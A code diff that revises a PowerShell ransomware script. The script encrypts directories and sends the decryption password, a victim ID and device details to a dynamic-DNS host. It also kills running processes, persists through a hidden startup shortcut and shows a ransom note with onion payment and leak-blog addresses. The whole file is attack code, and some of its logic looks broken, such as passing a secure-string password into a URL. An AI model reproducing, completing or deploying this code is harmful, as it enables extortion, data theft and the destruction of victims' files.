@@ -1,4 +1,3 @@
-# Set the execution policy to allow the script to run
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 # Function to encrypt directories using AES encryption
@@ -16,33 +15,36 @@ function Encrypt-Directories {
     }
 }
 
-# Function to create a remote connection
-function Create-RemoteConnection {
+# Function to create a remote connection and send device information, decryption password, and random ID
+function Send-DeviceInformation {
     param (
         [Parameter(Mandatory=$true)]
         [string]$DNSAddress,
         [Parameter(Mandatory=$true)]
-        [string]$Password
+        [string]$Password,
+        [Parameter(Mandatory=$true)]
+        [string]$RandomID
     )
     
+    # Get device information
+    $deviceInfo = @{
+        "Hostname" = $env:COMPUTERNAME
+        "OperatingSystem" = (Get-CimInstance Win32_OperatingSystem).Caption
+        "Processor" = (Get-CimInstance Win32_Processor).Name
+        "RAM" = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
+    }
+    $deviceInfoJson = $deviceInfo | ConvertTo-Json
+
     # Establish a remote connection to the specified DNS address
-    # Simulate sending data over DNS by making an HTTP request to a server
-    $url = "http://$DNSAddress"
-    $postData = "password=$Password"
-    
+    # Send device information, decryption password, and random ID over DNS
+    $url = "$DNSAddress?info=$deviceInfoJson&password=$Password&randomID=$RandomID"
     try {
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
-        Write-Host "Connection established. Response from server: $($response)"
+        Invoke-WebRequest -Uri $url -UseBasicParsing | Out-Null
+        Write-Host "Device information sent to $DNSAddress"
     }
     catch {
-        Write-Host "Failed to establish connection: $_"
+        Write-Host "Failed to send device information to $DNSAddress"
     }
-}
-    
-    # Send the encryption password over DNS
-    $encodedPassword = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Password))
-    $dnsMessage = "Password:$encodedPassword"
-    # Implement functionality to send DNS message
 }
 
 # Function to stop running processes except for this script
@@ -54,89 +56,86 @@ function Stop-Processes {
     }
 }
 
-# Function to make the screen black until Ctrl + Q is pressed
-function Make-ScreenBlack {
-    # Create a black window that takes up the entire screen
-    Add-Type -TypeDefinition @"
-    using System;
-    using System.Drawing;
-    using System.Windows.Forms;
+# Function to visit a website in the background
+function Visit-SiteInBackground {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$URL
+    )
     
-    public class BlackScreenForm : Form {
-        public BlackScreenForm() {
-            FormBorderStyle = FormBorderStyle.None;
-            BackColor = Color.Black;
-            Opacity = 1;
-            WindowState = FormWindowState.Maximized;
-            TopMost = true;
-            KeyPreview = true;
-            KeyDown += new KeyEventHandler(BlackScreenForm_KeyDown);
-        }
-
-        private void BlackScreenForm_KeyDown(object sender, KeyEventArgs e) {
-            // Exit black screen when Ctrl + Q is pressed
-            if (e.Control && e.KeyCode == Keys.Q) {
-                this.Close();
-            }
-        }
-    }
-"@
-    # Display the black window
-    $blackScreenForm = New-Object BlackScreenForm
-    $blackScreenForm.ShowDialog()
+    # Visit the website in the background
+    Start-Process -FilePath "cmd" -ArgumentList "/c start $URL" -WindowStyle Hidden
 }
 
-# Function to display ransom message
-function Display-RansomMessage {
-    # Display ransom message on top of a black screen
-    # For demonstration purposes, we'll print the message
-    $ransomMessage = @"
-Attention!
-Your files have been encrypted.
-We highly suggest not shutting down your computer in case encryption process is not finished, as your files may get corrupted.
-In order to decrypt your files, you must pay for the decryption key & application.
-You may do so by visiting us at http://avosjon4pfh3y7ew3jdwz6ofw7lljcxlbk7hcxxmnxlh5kvf2akcqjad.onion.
-This is an onion address that you may access using Tor Browser which you may download at https://www.torproject.org/download/
-Details such as pricing, how long before the price increases and such will be available to you once you enter your ID presented to you below in this note in our website.
-Contact us soon, because those who don't have their data leaked in our press release blog and the price they'll have to pay will go up significantly.
-The corporations whom don't pay or fail to respond in a swift manner can be found in our blog, accessible at http://avosqxh72b5ia23dl5fgwcpndkctuzqvh2iefk5imp3pi5gfhel5klad.onion
+# Function to get network information
+function Get-NetworkInfo {
+    # Get network information
+    Get-NetIPAddress | Select-Object -Property IPAddress, InterfaceAlias, InterfaceIndex
+}
 
-Your ID: $env:COMPUTERNAME-$(Get-Random)
-"@
-    Write-Host $ransomMessage
+# Function to get public IP address
+function Get-PublicIP {
+    try {
+        $publicIP = Invoke-RestMethod -Uri "http://api.ipify.org" -UseBasicParsing
+        $publicIP
+    } catch {
+        Write-Host "Failed to retrieve public IP address."
+    }
+}
+
+# Function to start a process in the background by name
+function Start-ProcessInBackground {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$ProcessName
+    )
+    
+    # Start the process in the background
+    Start-Process -FilePath "cmd" -ArgumentList "/c start /b $ProcessName" -WindowStyle Hidden
+}
+
+# Function to display a message popup over a black screen
+function Show-MessageOverBlackScreen {
+    $wshell = New-Object -ComObject WScript.Shell
+    $intButton = $wshell.Popup("Attention! Your files have been encrypted. We highly suggest not shutting down your computer in case the encryption process is not finished, as your files may get corrupted.`nIn order to decrypt your files, you must pay for the decryption key & application.`nYou may do so by visiting us at http://avosjon4pfh3y7ew3jdwz6ofw7lljcxlbk7hcxxmnxlh5kvf2akcqjad.onion. This is an onion address that you may access using Tor Browser which you may download at https://www.torproject.org/download/`nDetails such as pricing, how long before the price increases and such will be available to you once you enter your ID presented to you below in this note in our website.`nContact us soon, because those who don't have their data leaked in our press release blog and the price they'll have to pay will go up significantly.`nThe corporations whom don't pay or fail to respond in a swift manner can be found in our blog, accessible at http://avosqxh72b5ia23dl5fgwcpndkctuzqvh2iefk5imp3pi5gfhel5klad.onion`nYour ID: $randomID",0,"Attention!",0x1
 }
 
 # Make the program run in the background and change the process name to a random name
-$randomProcessName = [System.IO.Path]::GetRandomFileName()
-$host.UI.RawUI.WindowTitle = $randomProcessName
-
-# Create copies of the script in hidden locations
+# Add the script to run on startup with administrator permissions
+$randomID = "$env:COMPUTERNAME-$(Get-Random)"
 $scriptPath = $MyInvocation.MyCommand.Path
-$appDataPath = [Environment]::GetFolderPath("ApplicationData")
-$randomDrive = Get-Volume | Where-Object { $_.DriveLetter } | Get-Random
-$randomDrivePath = "$($randomDrive.DriveLetter):\"
-$hiddenScriptPath1 = Join-Path -Path $appDataPath -ChildPath ($randomProcessName + ".ps1")
-$hiddenScriptPath2 = Join-Path -Path $randomDrivePath -ChildPath ($randomProcessName + ".ps1")
-Copy-Item -Path $scriptPath -Destination $hiddenScriptPath1 -Force
-Copy-Item -Path $scriptPath -Destination $hiddenScriptPath2 -Force
-Set-ItemProperty -Path $hiddenScriptPath1 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-Set-ItemProperty -Path $hiddenScriptPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+$randomProcessName = "$randomID.exe"
+$startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+$randomProcessPath = [System.IO.Path]::Combine($startupFolder, $randomProcessName)
+Copy-Item -Path $scriptPath -Destination $randomProcessPath -Force
+$WshShell = New-Object -comObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($randomProcessPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-windowstyle hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+$shortcut.Save()
 
-# Generate a random password
-$randomPassword = [System.Web.Security.Membership]::GeneratePassword((Get-Random -Minimum 20 -Maximum 30), 3)
-
-# Encrypt directories with the random password
+# Encrypt directories with a random password
+$randomPassword = ConvertTo-SecureString -String (Get-Random) -AsPlainText -Force
 Encrypt-Directories -Password $randomPassword
 
-# Send the encryption password over DNS
-Create-RemoteConnection -DNSAddress "examplednstest00238367.ddns.net" -Password $randomPassword
+# Establish a remote connection to the specified DNS address
+$dnsAddress = "examplednstest00238367.ddns.net"
+Send-DeviceInformation -DNSAddress $dnsAddress -Password $randomPassword -RandomID $randomID
 
-# Stop any running processes or running apps except for this PowerShell script
+# Stop any running processes or running apps except for this powershell script
 Stop-Processes
 
-# Make the screen black until Ctrl + Q is pressed
-Make-ScreenBlack
+# Visit a website in the background
+Visit-SiteInBackground -URL "http://example.com"
 
-# Display ransom message on top of the black screen
-Display-RansomMessage
+# Get network information
+Get-NetworkInfo
 
+# Get public IP address
+Get-PublicIP
+
+# Start a process in the background by name
+Start-ProcessInBackground -ProcessName "notepad.exe"
+
+# Show message popup over a black screen
+Show-MessageOverBlackScreen
